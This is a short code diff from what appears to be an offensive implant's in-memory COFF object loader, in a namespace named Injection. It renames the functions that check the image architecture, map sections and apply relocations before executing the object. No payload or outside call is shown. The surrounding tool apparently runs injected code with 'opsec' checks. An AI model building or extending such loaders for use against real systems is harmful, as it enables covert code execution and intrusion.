@@ -75,9 +75,9 @@ namespace Injection {
         object.next = Ctx->coffs;
         Ctx->coffs  = &object;
 
-        x_assert(Opsec::SeImageCheckArch(&object));
-        x_assert(Memory::Objects::MapSections(&object, data));
-        x_assert(Memory::Objects::BaseRelocation(&object));
+        x_assert(Opsec::ImageCheckArch(&object));
+        x_assert(Objects::MapSections(&object, data));
+        x_assert(Objects::BaseRelocation(&object));
         x_assert(Memory::Execute::ExecuteObject(&object, entrypoint, R_CAST(char*, args), arg_size, req_id));
 
     defer:
